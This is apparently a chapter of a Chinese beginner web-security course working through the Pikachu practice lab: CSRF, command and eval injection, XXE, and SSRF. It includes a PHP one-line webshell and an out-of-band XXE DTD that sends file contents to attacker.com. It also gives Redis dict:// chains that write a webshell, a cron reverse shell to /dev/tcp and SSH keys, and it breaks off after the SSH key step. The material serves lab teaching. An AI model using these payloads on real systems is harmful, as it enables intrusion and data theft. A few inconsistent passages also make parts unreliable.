# Day 31：Pikachu其他漏洞与靶场总结

> **🎯 靶场实战** | 难度：⭐⭐ | 预计学习：55 分钟

---

# 第31章 Pikachu其他漏洞与靶场总结 🎉

## 开篇引入：Pikachu宝藏多，漏洞大冒险继续！🚀

哈喽各位小伙伴们大家好！👋 欢迎来到第24章！

上两章我们已经搞定了Pikachu里的XSS、SQL注入、文件上传这些"重头戏"，是不是觉得收获满满？但是！你以为Pikachu就这点东西吗？那你可就太小瞧它了！🤔

打个比方 🎯：
> 这就像你去逛一个大型游乐园，你刚玩完过山车、大摆锤这些最刺激的项目，觉得已经很满足了，但一转头发现旁边还有鬼屋、摩天轮、碰碰车、密室逃脱……好玩的还多着呢！🎢🎡🎠

没错！Pikachu就像这样一个"漏洞主题乐园，除了我们已经学过的那些，还有很多有意思的漏洞模块等着我们去探索呢！这一章，我们就来个"Pikachu剩余项目大扫荡"，把剩下的好玩的模块都快速过一遍，开开眼界，长长见识！😎

可能有小伙伴会问："这些漏洞都重要吗？我都需要全部掌握吗？"

问得好！👍 我的答案是：**现阶段不用全部掌握，先混个脸熟，知道有这么个东西就行！**

就像你去旅游，第一次去一个新城市，你不可能把每个景点都玩遍玩透。你先坐个观光大巴绕城一圈，知道这个城市大概有啥，哪些地方好玩，心里有个地图。等以后真的需要了，再专门深入研究也不迟。🗺️

这一章的学习目标很简单：
- 知道这些漏洞是干啥的？→ 有个概念
- 大概怎么用的？→ 简单演示一下
- 危险程度怎么样？→ 心里有数就行

好了，废话不多说，让我们继续Pikachu剩余漏洞大冒险，现在开始！冲鸭！🦆💨

---

## CSRF模块：老朋友再叙旧 😊

### CSRF基础回顾

首先上场的第一位选手是——**CSRF（跨站请求伪造）**！

哎哎哎，别走啊！我知道你们想说什么："CSRF我们不是学过了吗？DVWA里就学过了！"🤦‍♂️

没错没错！CSRF确实是我们的老朋友了，在DVWA那章我们就详细讲过。但既然Pikachu里也有这个模块，咱们就快速过一遍，就当复习了！温故而知新嘛~ 📚

> **生活小例子回顾** 🎯
> 
> 还记得CSRF是什么吗？用大白话讲：
> - 你登录了银行网站，浏览器里存着你的登录状态（Cookie）
> - 这时候你访问了一个坏人的网站，这个网站里偷偷放了一张图片，图片的地址是银行转账的链接
> - 你的浏览器会自动带着你的Cookie去请求这个转账链接
> - 银行一看，哎？这是你的Cookie啊，是你本人操作！于是就转账了
> - 全程你啥都不知道，钱就没了... 💸
> 
> 就像你在公司刷了工牌，门禁认识你了。这时候有人拿你的工牌照片去让门禁开门，门禁一看，哦，是自己人，开门！门就开了。

简单说，CSRF就是**借你的身份，干坏事**。坏人不用偷你的密码，只要利用你已经登录的状态就行。

### GET型CSRF

好，我们先来看看Pikachu里的GET型CSRF。

打开Pikachu，找到"CSRF"模块，第一个就是"GET型CSRF"。

页面上是一个修改个人信息的表单，我们先登录一下（账号密码都是vince/123456）。

登录进去后，我们可以看到自己的个人信息：姓名、性别、手机号、住址等等。下面有个"修改"按钮，点一下就能改信息。

好，我们来抓个包看看修改信息的时候发了什么请求。📡

用BurpSuite抓一下修改请求，你会发现：
```
GET /pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=男&phonenum=13888888888&add=北京市朝阳区&email=vince@pikachu.com&submit=submit
```

嚯！好家伙，全是GET参数！这就意味着——只要我们构造一个链接，把参数改一改，诱导用户点一下，就能修改他的信息了！😱

比如我们构造一个修改手机号的链接：
```
http://127.0.0.1/pikachu-master/vul/csrf/csrfget/csrf_get_edit.php?sex=男&phonenum=13999999999&add=北京市朝阳区&email=vince@pikachu.com&submit=submit
```

然后把这个链接发给已经登录的用户，他一点，手机号就被改了！

这就是GET型CSRF，最简单的一种。就像你家门锁是用密码的，我知道密码写在纸上，谁拿到纸谁就能开门。🔑

### POST型CSRF

接下来是POST型CSRF。

GET型是把参数都放在URL里，太明显了，用户一眼就能看出来不对劲。那POST型呢？参数在请求体里，藏得更深一点。

但是！这就安全了吗？当然不是！POST型照样可以CSRF！😈

怎么搞？很简单，构造一个表单页面，里面有个表单，method是POST，action是目标地址，然后用JavaScript自动提交这个表单。用户一访问这个页面，表单就自动提交了，用户啥也不知道。

就像你去自动取款机取钱，取完钱忘拔卡了。这时候有人过来，不用知道你密码，直接就能操作你的账户。💳

Pikachu里的POST型CSRF和GET型差不多，就是请求方式不一样而已。原理都是一样的——借你的身份干活。

### Token防御的CSRF

然后是第三个——"CSRF之Token验证。

哎？有Token了，是不是就安全了？🤔

Token是什么？简单说就是一个随机字符串，每次请求的时候服务器生成一个Token放在页面里，你提交的时候要带着这个Token一起提交，服务器验证Token对不对，对了才处理。

这就像你去银行办业务，不仅要身份证，还要验证码。光有身份证不行，还得有验证码，两个都对了才给你办。📱

但是！Token也不是绝对安全的。如果这个Token也能被偷到呢？比如有个XSS漏洞，能把用户页面里的Token偷出来，那CSRF不就又能用了吗？🤷‍♂️

所以说，安全是一个整体，一环扣一环。一个地方破了，其他地方可能也跟着遭殃。就像木桶效应，能装多少水取决于最短的那块木板。🪣

好了，CSRF我们就快速复习到这里。都是老朋友了，大家应该都还记得吧？不记得的小伙伴回去翻DVWA那章再看看哦~ 📖

---

## 命令执行/代码执行模块：危险！慎入！☠️

接下来这俩可是重量级选手——**命令执行**和**代码执行**！这俩可是高危漏洞，危险程度五颗星！⭐⭐⭐⭐⭐

为什么这么危险？因为这俩漏洞都能直接让你控制服务器！就像你直接拿到了别人家的钥匙，想干啥干啥。🔑

### 命令执行（exec）

先来说说**命令执行**，也叫"命令注入"。这个我们在DVWA里也学过了对吧？老朋友了属于是。😊

#### 什么是命令执行？

用大白话讲：**网站把用户输入的内容，直接当成系统命令去执行了**。

> **生活小例子** 🎯
> 
> 想象一下：
> - 你去餐厅吃饭，跟服务员说："给我来份宫保鸡丁"
> - 服务员把你的话原封不动传给后厨
> - 后厨就给你做了份宫保鸡丁 ✅
> 
> 但是如果服务员比较傻，你说啥他都传：
> - 你说："给我来份宫保鸡丁，顺便把后厨的钱都给我"
> - 服务员原封不动传给后厨
> - 后厨不仅做了菜，还把钱都给你了... 💰💸
> 
> 这就是命令注入！用户输入的内容被当成命令执行了！

简单说，就是网站有个功能，会调用系统命令，而用户能控制这个命令的一部分。然后用户通过一些特殊符号（比如管道符、分号、&&之类的），就能执行自己想执行的命令。

#### Pikachu里的命令执行演示

好，我们来看看Pikachu里的命令执行模块。打开"RCE"模块，第一个是"exec 'ping"。

页面上有个输入框，提示"请输入IP地址，系统会帮你ping一下"。

哎？ping？这不就是我们DVWA里玩过的吗？熟啊！太熟了！🍳

我们先输入个 `127.0.0.1` 试试：

```
输入：127.0.0.1
```

页面返回了ping的结果，一切正常。就像你让助理帮你ping一下某个地址，助理ping完把结果告诉你。📡

那怎么注入呢？很简单，用管道符啊！我们试试：

```
输入：127.0.0.1 | whoami
```

哎？是不是看到结果了！我们看到了当前系统的用户名！😎

> **小知识** 📝
> 
> 常用的命令连接符：
> - `|`：管道符，前面的输出作为后面的输入（直接执行后面的命令）
> - `;`：分号，前面执行完执行后面的
> - `&&`：前面的执行成功了才执行后面的
> - `||`：前面的执行失败了才执行后面的
> - `&`：后台执行，前面后台执行，后面也执行

这些符号就像不同的连词，把两个命令连起来。就像一句话里的"然后"、"而且"、"或者"之类的。📝

我们再试试查看当前目录：

```
输入：127.0.0.1 | dir
```

（Windows用dir，Linux用ls）

看到目录列表了吧？这就是命令执行的威力！想执行什么系统命令都行！

危险吧？这就是为什么命令执行是高危漏洞。有了这个，你基本上就能在服务器上为所欲为了。就像你闯进了别人家，想翻啥翻啥。🏠

### 代码执行（eval）

接下来是更猛的——**代码执行**！

哎？命令执行和代码执行有啥区别？不都是执行东西吗？🤔

好问题！👍 我来给你掰扯掰扯：

- **命令执行**：执行的是**系统命令**（比如dir、ls、whoami这些）
- **代码执行**：执行的是**网站代码**（比如PHP代码、Python代码等）

打个比方 🎯：
> 命令执行就像你给保安说句话，保安去执行系统命令
> 代码执行就像你直接给程序员说代码，程序员直接运行代码
> 
> 哪个更厉害？当然是代码执行更直接！因为代码执行能直接写代码，想写啥写啥，比系统命令灵活多了！

代码执行就相当于你直接拿到了网站的"源代码编辑器"，想写啥写啥。这还得了？😱

#### 什么是代码执行？

代码执行，顾名思义，就是**用户输入的内容被当成了代码来执行**。

PHP里常见的代码执行函数有：
- `eval()`：把字符串当PHP代码执行
- `assert()`：断言函数，也能执行代码
- `system()`、`exec()`这些其实是命令执行，不是代码执行
- 还有很多其他函数...

> **生活小例子** 🎯
> 
> 想象一下：
> - 网站有个功能，你输入什么数学公式，网站帮你计算
> - 你输入 `1+1`，网站给你返回 2 ✅
> 
> 但是网站用了eval()函数来计算：
> - 你输入 `phpinfo();`
> - 网站直接执行了这段PHP代码
> - 然后你就看到了phpinfo页面... 💀
> 
> 这就是代码执行！

一句话木马是什么？一句话木马就是利用代码执行！

```php
<?php eval($_POST['cmd']); ?>
```

这就是最经典的一句话木马。你把这个文件传到服务器上，然后用菜刀、蚁剑之类的工具连接，就能控制服务器了。这本质上就是代码执行。🪓

#### Pikachu里的代码执行演示

好，我们来看看Pikachu里的代码执行模块。打开"RCE"模块，第二个是"eval"。

页面上有个输入框，提示"输入一个字符串，系统会帮你显示出来"。

我们先输入个正常的试试：

```
输入：hello world
```

页面显示了hello world，一切正常。

但是！我们输入PHP代码试试：

```
输入：phpinfo();
```

哎？等等，怎么没反应？哦不对，得加个PHP标签？或者直接写？

我们试试：

```
输入：fputs(fopen('shell.php','w'),'<?php eval($_POST[cmd]);?>');
```

哎？不对不对，Pikachu的代码执行是怎么实现的来着？让我们看看提示...

哦，对了，Pikachu的代码执行是直接把输入的内容放到eval()里执行的。所以我们直接写PHP代码就行，不用加<?php标签。

我们试试：

```
输入：phpinfo();
```

不对？再看看页面源码？哦，可能输出在页面里？我们再仔细看看...

哦对了！应该是这样的，Pikachu的代码执行是这样的：你输入的内容会被当作PHP代码执行，但是执行结果可能输出在页面上，也可能不输出，取决于代码怎么写的。

我们试试输出点明显的，比如：

```
输入：echo 'hello 我是代码执行！';
```

或者试试：

```
输入：system('whoami');
```

对了！这样就能执行系统命令了！因为代码执行里可以调用系统命令的函数嘛~ 😎

看到了吧？代码执行就是这么猛！直接写PHP代码，想干啥干啥。比命令执行还灵活，因为你可以写各种逻辑，各种操作。

> **小提示** 💡
> 
> 命令执行和代码执行的关系：
> - 代码执行 > 命令执行
> - 有代码执行一定能命令执行
> - 有命令执行不一定能代码执行
> 
> 就像数学里的包含关系，代码执行是更大的那个圈。⭕

好了，命令执行和代码执行我们就讲到这里。这俩漏洞都是高危中的高危，现实中遇到了，基本就等于服务器被拿下了。大家一定要重视！⚠️

---

## XXE漏洞：XML外部实体注入 📄

接下来这个漏洞，名字听起来就有点高大上了——**XXE（XML External Entity Injection）**，中文叫"XML外部实体注入"。

哎？XML是什么？实体又是什么？这名字听着就晕... 😵

别慌！这个漏洞新手阶段不用掌握太深，知道有这么个东西，大概是干啥的，就行。我们先混个脸熟~ 😊

### 什么是XXE？

先用大白话给你解释一下：

**XXE就是：XML解析的时候，允许引用外部的实体，从而导致可以读文件、发起请求等危险操作。

听不懂是吧？没事，我给你拆开讲。

首先，XML是什么？XML是一种标记语言，用来存数据、传数据的。就像JSON一样，是一种数据格式。

比如一个XML长这样：
```xml
<user>
  <name>张三</name>
  <age>18</age>
</user>
```

就像JSON长这样：
```json
{
  "name": "张三",
  "age": 18
}
```

都是存数据用的，只是格式不一样。📦

那"实体"又是什么？XML里有个功能叫"实体"，你可以理解成"变量"，先定义好，后面引用。

比如：
```xml
<!DOCTYPE foo [
  <!ENTITY xxe "hello world">
]>
<user>
  <name>&xxe;</name>
</user>
```

这里面`&xxe;`就会被替换成"hello world"。就像你提前定义了一个变量，后面用的时候直接引用变量名就行。📝

那"外部实体"呢？就是这个实体的内容不是写死的，而是从外部文件或者URL加载的。

比如：
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<user>
  <name>&xxe;</name>
</user>
```

看到没？SYSTEM "file:///c:/windows/win.ini" 这就是从外部文件加载实体内容。

然后解析这个XML的时候，&xxe;就会被替换成win.ini文件的内容！😱

这就是XXE漏洞！
> **生活小例子** 🎯
> 
> 想象一下：
> - 你去图书馆借书，跟图书管理员说："帮我把《西游记》拿来"
> - 管理员把《西游记》给你了 ✅
> 
> 但是管理员比较傻，你说啥他都信：
> - 你说："帮我把保险柜里的钱拿来"（外部实体）
> - 管理员真的去保险柜把钱拿给你了... 💰
> 
> 这就是XXE！XML解析器太信任用户输入的XML了，用户说引用啥就引用啥，结果就出问题了！

### XXE能做什么？

XXE漏洞能做的事情可多了：

1. **读取本地文件** 📂
   - 用file://协议读本地文件
   - 比如读配置文件、读源代码、读敏感文件...
   - 就像你能随便翻别人家的抽屉

2. **SSRF（服务端请求伪造）** 🌐
   - 让服务器去请求某个URL
   - 比如扫内网、攻击内网服务
   - 这个我们后面马上会讲

3. **DoS攻击** 💥
   - 构造一些特殊的实体引用，让服务器崩溃
   - 就像"十亿笑声"攻击

4. **还有其他的...**

反正就是很危险就对了！⚠️

### 为什么会有XXE漏洞？

很简单——XML解析器默认开启了外部实体引用的功能。而开发人员在解析用户传入的XML的时候，没有禁掉外部实体。

就像你家门没关，谁都能进来。🚪

那怎么防御？很简单，解析XML的时候，把外部实体引用给禁掉就行了。大部分XML解析库都有这个选项。

### Pikachu里的XXE演示

好，我们来看看Pikachu里的XXE模块。打开"XXE"模块。

页面上有个输入框，让我们输入XML。那我们来构造一个Payload试试：

先输入一个简单的XML看看：
```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY hacker "我是实体内容">
]>
<name>&hacker;</name>
```

提交，看看页面返回了什么？是不是返回了"我是实体内容"？

说明实体引用是生效的！那我们试试读文件？

我们来构造一个读文件的Payload：
```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY hacker SYSTEM "file:///c:/windows/win.ini">
]>
<name>&hacker;</name>
```

（Windows系统读c:/windows/win.ini，Linux的话读/etc/passwd）

提交！哎？是不是看到win.ini的内容了？😎

看到没？这就是XXE的威力！不用登录，不用啥权限，就能读服务器上的文件！

---

### 进阶玩法一：php://filter 读取PHP源码不报错 📜

刚才我们直接用 `file://` 读PHP文件的时候，你可能会遇到一个问题——**报错**！为什么？因为PHP文件里有 `<?php ?>` 这些标签，XML解析器一看到这些"乱七八糟"的字符，就会报错，说"XML格式不合法"。😫

那怎么办呢？别慌！我们有个神器——**php://filter 伪协议 + Base64编码**！

#### 原理揭秘 🔬

思路是这样的：
1. 用 `php://filter/read=convert.base64-encode/resource=文件路径` 来读取文件
2. 这个协议会把文件内容**先转成Base64编码**，再返回给我们
3. Base64编码里只有字母、数字、+、/、= 这些"安全字符"，XML解析器不会报错
4. 我们拿到Base64字符串后，再自己解码，就能看到原始的PHP源码了！

#### Payload 演示 ✨

比如我们想读网站根目录下的 `index.php`：

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY hacker SYSTEM "php://filter/read=convert.base64-encode/resource=../index.php">
]>
<name>&hacker;</name>
```

提交后，页面上会返回一串Base64编码的字符串，比如：
```
PD9waHAgcGhwaW5mbygpOyA/Pg==
```

然后我们把这串Base64解码一下，就能得到原始PHP代码：
```
<?php phpinfo(); ?>
```

> **生活小例子** 🎯
> 
> 这就像你想把一把宝剑（PHP源码）运过海关（XML解析器），但是海关不让运"尖锐物品"。怎么办？
> 你把宝剑拆成零件，用一个布包（Base64编码）裹起来，写上"工艺品"，海关就放行了。
> 运过去之后，你再把布包拆开（解码），重新组装成宝剑！⚔️

---

### 进阶玩法二：Blind XXE（OOB带外数据）🕵️

什么是Blind XXE？就是——**你构造的XXE Payload提交后，页面上不返回任何结果**，既不显示文件内容，也不报错，就像石沉大海一样。

这时候怎么办呢？我们得想办法让服务器**主动把数据"寄"给我们**！这就是 **OOB（Out-of-Band，带外通道）** 技术。

#### 原理（大白话版）📖

1. 我们自己搭一个"恶意DTD服务器"（比如放在我们的VPS上）
2. 让被攻击的服务器**去加载我们的恶意DTD文件**
3. 在恶意DTD文件里，定义一个实体，这个实体的内容是"读取服务器上的敏感文件 + 把内容拼到URL里 + 请求我们的服务器"
4. 服务器解析XML时，会：读文件 → 拼接到URL → 请求我们的服务器
5. 我们看自己服务器的访问日志，就能拿到敏感文件的内容了！

#### 三步走流程 🚶‍♂️🚶‍♀️🚶

**第一步：在我们的VPS上放一个恶意DTD文件**

比如我们的VPS地址是 `http://attacker.com/`，在上面放一个叫 `evil.dtd` 的文件：

```xml
<!ENTITY % file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfiltrate;
```

看不懂没关系，大概意思是：
- `%file`：先把win.ini的内容读出来
- `%eval`：再定义一个实体exfiltrate，这个实体是去请求 `http://attacker.com/?data=文件内容`
- 最后执行exfiltrate，把数据"寄"出去

**第二步：构造XXE Payload，引用我们的恶意DTD**

```xml
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<name>test</name>
```

看到没？这里我们定义了一个外部实体 `%remote`，指向我们的evil.dtd。服务器解析XML的时候，会去请求我们的evil.dtd，然后执行里面的内容！

**第三步：查看我们服务器的访问日志** 📋

等被攻击的服务器解析完XML后，我们去看自己VPS的访问日志，会看到类似这样的记录：
```
GET /?data=;%20for%2016-bit%20app%20support [fonts] ...
```

`data=` 参数后面的内容，就是win.ini的内容！我们拿到了！🎉

> **生活小例子** 🎯
> 
> Blind XXE就像什么呢？
> 
> 你想知道小明家保险柜里放了啥，但你没法直接去小明家看。
> 于是你给小明寄了一封信（Payload），信里说："把你家保险柜里的东西，抄一份，寄到这个地址：你自己家的地址"
> 
> 小明傻乎乎地照做了，保险柜里的东西就这么寄到你手里了！📮

---

### 进阶玩法三：CDATA包裹读取含特殊字符的文件 📦

有些文件内容里含有 `&`、`<`、`>`、`'`、`"` 这些XML的特殊字符，直接读出来会导致XML解析报错。这时候怎么办？

用 **CDATA（Character Data）** 把内容包起来！CDATA里的内容会被XML解析器当成纯文本，不做解析。

#### 原理 🔬

CDATA的格式是 `<![CDATA[ 内容 ]]>`，放在这标签里的内容，XML解析器会原封不动地保留。

但是CDATA不能直接写在实体里，我们需要用"参数实体拼接"的技巧来构造：

#### 恶意DTD文件（evil2.dtd）

```xml
<!ENTITY % start "<![CDATA[">
<!ENTITY % content SYSTEM "file:///c:/config.php">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<foo>&start;&content;&end;</foo>">
%wrapper;
```

意思是把内容拼起来变成：
```xml
<foo><![CDATA[ config.php的内容 ]]></foo>
```

这样特殊字符就被CDATA保护起来了，不会报错！

---

### XXE攻击全景图 SVG 🗺️

<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 800 500" width="800" height="500">
  <defs>
    <linearGradient id="bg1" x1="0%" y1="0%" x2="100%" y2="100%">
      <stop offset="0%" style="stop-color:#fff7ed;stop-opacity:1" />
      <stop offset="100%" style="stop-color:#fef3c7;stop-opacity:1" />
    </linearGradient>
  </defs>
  <rect width="800" height="500" fill="url(#bg1)" rx="15"/>
  <text x="400" y="40" text-anchor="middle" font-size="24" font-weight="bold" fill="#92400e">XXE漏洞攻击全景图</text>
  
  <!-- 中心: XXE -->
  <rect x="340" y="210" width="120" height="70" rx="10" fill="#fbbf24" stroke="#92400e" stroke-width="3"/>
  <text x="400" y="245" text-anchor="middle" font-size="18" font-weight="bold" fill="#78350f">XXE 漏洞</text>
  <text x="400" y="265" text-anchor="middle" font-size="12" fill="#78350f">XML外部实体注入</text>
  
  <!-- 读文件 -->
  <rect x="60" y="70" width="160" height="80" rx="8" fill="#fde68a" stroke="#92400e" stroke-width="2"/>
  <text x="140" y="100" text-anchor="middle" font-size="15" font-weight="bold" fill="#78350f">📄 读取本地文件</text>
  <text x="140" y="120" text-anchor="middle" font-size="11" fill="#78350f">file:///etc/passwd</text>
  <text x="140" y="136" text-anchor="middle" font-size="11" fill="#78350f">php://filter Base64读源码</text>
  <line x1="340" y1="230" x2="220" y2="120" stroke="#92400e" stroke-width="2" marker-end="url(#arrow1)"/>
  
  <!-- SSRF -->
  <rect x="320" y="70" width="160" height="80" rx="8" fill="#fde68a" stroke="#92400e" stroke-width="2"/>
  <text x="400" y="100" text-anchor="middle" font-size="15" font-weight="bold" fill="#78350f">🌐 SSRF攻击</text>
  <text x="400" y="120" text-anchor="middle" font-size="11" fill="#78350f">http:// 扫内网Web</text>
  <text x="400" y="136" text-anchor="middle" font-size="11" fill="#78350f">访问内网敏感服务</text>
  <line x1="400" y1="210" x2="400" y2="150" stroke="#92400e" stroke-width="2" marker-end="url(#arrow1)"/>
  
  <!-- Blind OOB -->
  <rect x="580" y="70" width="160" height="80" rx="8" fill="#fde68a" stroke="#92400e" stroke-width="2"/>
  <text x="660" y="100" text-anchor="middle" font-size="15" font-weight="bold" fill="#78350f">🕵️ Blind OOB带外</text>
  <text x="660" y="120" text-anchor="middle" font-size="11" fill="#78350f">加载远程恶意DTD</text>
  <text x="660" y="136" text-anchor="middle" font-size="11" fill="#78350f">数据回传到攻击服务器</text>
  <line x1="460" y1="230" x2="580" y2="120" stroke="#92400e" stroke-width="2" marker-end="url(#arrow1)"/>
  
  <!-- DoS -->
  <rect x="60" y="370" width="160" height="80" rx="8" fill="#fecaca" stroke="#991b1b" stroke-width="2"/>
  <text x="140" y="400" text-anchor="middle" font-size="15" font-weight="bold" fill="#7f1d1d">💥 DoS拒绝服务</text>
  <text x="140" y="420" text-anchor="middle" font-size="11" fill="#7f1d1d">十亿笑声攻击</text>
  <text x="140" y="436" text-anchor="middle" font-size="11" fill="#7f1d1d">递归实体耗尽内存</text>
  <line x1="340" y1="260" x2="220" y2="380" stroke="#991b1b" stroke-width="2" marker-end="url(#arrow1)"/>
  
  <!-- RCE -->
  <rect x="320" y="370" width="160" height="80" rx="8" fill="#fecaca" stroke="#991b1b" stroke-width="2"/>
  <text x="400" y="400" text-anchor="middle" font-size="15" font-weight="bold" fill="#7f1d1d">☠️ 远程代码执行</text>
  <text x="400" y="420" text-anchor="middle" font-size="11" fill="#7f1d1d">expect:// 协议执行命令</text>
  <text x="400" y="436" text-anchor="middle" font-size="11" fill="#7f1d1d">(需要PHP开启expect扩展)</text>
  <line x1="400" y1="280" x2="400" y2="370" stroke="#991b1b" stroke-width="2" marker-end="url(#arrow1)"/>
  
  <!-- XInclude -->
  <rect x="580" y="370" width="160" height="80" rx="8" fill="#fde68a" stroke="#92400e" stroke-width="2"/>
  <text x="660" y="400" text-anchor="middle" font-size="15" font-weight="bold" fill="#78350f">📎 XInclude攻击</text>
  <text x="660" y="420" text-anchor="middle" font-size="11" fill="#78350f">无DOCTYPE权限时</text>
  <text x="660" y="436" text-anchor="middle" font-size="11" fill="#78350f">用xi:include嵌入外部文件</text>
  <line x1="460" y1="260" x2="580" y2="380" stroke="#92400e" stroke-width="2" marker-end="url(#arrow1)"/>
  
  <defs>
    <marker id="arrow1" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto">
      <polygon points="0 0, 10 3, 0 6" fill="#92400e" />
    </marker>
  </defs>
</svg>

---

### XXE漏洞防御（划重点！）🛡️

知道了怎么攻击，也要知道怎么防御。其实XXE的防御很简单，记住这几条：

1. **禁用外部实体（DDoS外部DTD）**：99%的XXE都是靠外部实体，所有XML解析库都有开关可以禁用
2. **禁用XInclude**：不用XInclude功能就关了
3. **用JSON代替XML**：现在前后端通信基本都用JSON了，能不用XML就不用
4. **白名单校验**：如果一定要用XML，就用白名单校验标签和属性，其他一律不允许

> **小提示** 💡
> 
> XXE这个漏洞，现在确实比较少见了，但在一些老系统、老框架（特别是早期的Spring、Struts2、微信支付回调、支付宝的老接口）里还是会遇到。
> 做渗透测试的时候，只要看到数据格式是XML的地方，随手丢个XXE Payload试试，说不定就有惊喜！🎁

好了，XXE的进阶玩法我们就讲到这里。接下来看看SSRF还有什么厉害的操作！🚀

---

## SSRF漏洞：让服务器帮你干活 🕵️

接下来这个漏洞也很有意思——**SSRF（Server-Side Request Forgery）**，中文叫"服务端请求伪造"。

名字听着挺绕口是吧？没事，我们用大白话讲，一下就懂了！😉

### 什么是SSRF？

**SSRF就是：让服务器帮你发请求。**

就这么简单？就这么简单！

> **生活小例子** 🎯
> 
> 想象一下：
> - 你去一个公司，公司有前台小姐姐 💁‍♀️
> - 你不能随便出去，但是前台能出去
> - 你想让前台帮你去隔壁公司门口看看有啥
> - 前台就真的去了，回来告诉你结果
> 
> 这就是SSRF！你不能直接访问内网，但是服务器能。你让服务器帮你访问内网的东西，服务器就帮你访问了，然后把结果告诉你。
> 
> 服务器就相当于那个前台小姐姐，你让她干啥她干啥。

为什么会有SSRF漏洞？很简单：
- 网站有个功能，会去请求一个URL
- 这个URL是用户可控的
- 用户能控制URL，就能让服务器请求任何地址

比如网站有个功能："输入一个网址，帮你把网页截图"、"输入一个图片地址，帮你下载图片"、"从某个URL获取数据"……这些功能都可能产生SSRF。

就像你让助理帮你买东西，你说买啥他买啥。你让他买违禁品他也去买... 🛒

### SSRF能做什么？

SSRF能做的事情可多了：

1. **扫描内网端口** 🔍
   - 让服务器去扫内网的IP和端口
   - 看看内网里开了哪些服务
   - 就像用服务器当"端口扫描器"

2. **访问内网资源** 📂
   - 访问内网的网站、内网的系统
   - 比如内网可能有很多没防护的系统
   - 就像通过前台帮你进了内网大门

3. **攻击内网服务** ⚔️
   - 利用SSRF攻击内网的Redis、MySQL等服务
   - 甚至能拿shell
   - 这个就比较高级了

4. **读取本地文件** 📄
   - 用file://协议读本地文件
   - 和XXE有点像
   - 比如file:///etc/passwd

5. **还有很多其他的...**

反正就是很危险的一个漏洞！⚠️

### SSRF常用协议

SSRF能使用的协议有很多，不同的协议能干不同的事：

| 协议 | 作用 |
|------|------|
| `http://` | 访问HTTP网站 | 最常用，访问网页 |
| `file://` | 读本地文件 | 读服务器上的文件 |
| `dict://` | 操作Redis等 | 攻击内网Redis服务 |
| `gopher://` | 构造各种请求 | 最强大，能构造POST请求等 |
| 还有其他... | |

就像不同的交通工具，能去不同的地方。🚗🚄✈️

### Pikachu里的SSRF演示

好，我们来看看Pikachu里的SSRF模块。打开"SSRF"模块。

Pikachu的SSRF模块有两个：一个是SSRF(curl)，一个是SSRF(file_get_content)。我们先看第一个。

页面上提示"请输入一个URL，远程获取图片"。

我们先输入个正常的URL试试：
```
输入：http://www.baidu.com
```

（或者其他能访问的地址）

页面返回了请求的结果。正常功能就是这样，正常的功能是获取远程图片的。

那我们试试让它读本地文件？
```
输入：file:///c:/windows/win.ini
```

哎？是不是读到win.ini的内容了？😎

看到没？这就是SSRF！让服务器读本地文件！

我们再试试让它访问内网的其他地址？比如访问本地的某个端口？
```
输入：http://127.0.0.1:3306
```

（MySQL默认端口是3306，如果开着的话会有反应）

---

### 进阶玩法一：dict:// 协议攻击 Redis 🏗️

刚才我们只是用SSRF扫扫端口、读读文件，这只是开胃小菜！真正的狠活是——**用 dict:// 协议直接攻击内网的 Redis 服务**！😱

#### 什么是 dict://？ 🤔

`dict://` 是一个字典服务器协议，在 SSRF 中，它可以让我们**直接向某个TCP端口发送一行命令**。而 Redis 是一个键值对数据库，它的命令是纯文本的、基于行的，完美契合 dict:// 的能力！

#### 攻击前提 ✅

1. 内网里有一台 Redis（默认端口 6379，而且大多数情况下 Redis 默认是**没有密码**的！）
2. SSRF 的后端是用 PHP 的 curl 或类似支持 dict 协议的函数发起请求

#### 三大必杀技 🎯

**必杀技一：写 Webshell 拿权限 🐚**

Redis 有个功能叫 `CONFIG SET dir` 可以设置数据保存路径，`CONFIG SET dbfilename` 可以设置文件名，`SAVE` 可以把内存里的键值对写入磁盘。我们只要：

1. 把 Redis 的保存路径改到网站根目录（比如 `/var/www/html`）
2. 把文件名改成 `shell.php`
3. 往 Redis 里存一个 key，内容是 `<?php eval($_GET['cmd']);?>`
4. 执行 SAVE，Redis 就会把数据写到 `shell.php` 里！

用 dict:// 实现的话，只要依次访问这些 URL 就行：

```
# 1. 设置保存路径为网站根目录
dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html

# 2. 设置文件名为 shell.php
dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php

# 3. 写入我们的一句话木马内容（注意格式）
dict://127.0.0.1:6379/SET:myshell:"\n\n\n<?php eval($_GET['cmd']);?>\n\n\n"

# 4. 执行保存，写入磁盘
dict://127.0.0.1:6379/SAVE
```

搞定！然后我们访问 `http://内网IP/shell.php?cmd=whoami`，就能执行命令了！🎉

**必杀技二：写定时任务反弹 Shell ⏰**

在 Linux 上，`/var/spool/cron/crontabs/root` 这个文件里放的是 root 用户的定时任务。我们用同样的方法：

```
dict://127.0.0.1:6379/CONFIG:SET:dir:/var/spool/cron/crontabs
dict://127.0.0.1:6379/CONFIG:SET:dbfilename:root
dict://127.0.0.1:6379/SET:xxx:"\n\n*/1 * * * * bash -i >& /dev/tcp/你的VPS/7777 0>&1\n\n"
dict://127.0.0.1:6379/SAVE
```

等一分钟，你的 VPS 的 7777 端口就会收到一个 root 权限的反向 Shell！💀

**必杀技三：写 SSH 公钥免密登录 🔑**

如果你知道服务器有个用户叫 redis 或者 root，你可以把你的 SSH 公钥写到对方的 `~/.ssh/authorized_keys` 文件里，然后直接免密 SSH 登录：

```
dict://127.0.0.1:6379/CONFIG:SET:dir:/root/.ssh
dict://127.0.0.1:6379/CONFIG:SET:dbfilename:authorized_keys
dict://127.0.0.1:6379/SET:pubkey:"\n\n你的SSH公钥字符串\n\n"
dict://127.0.0.1:6379/SAVE
```

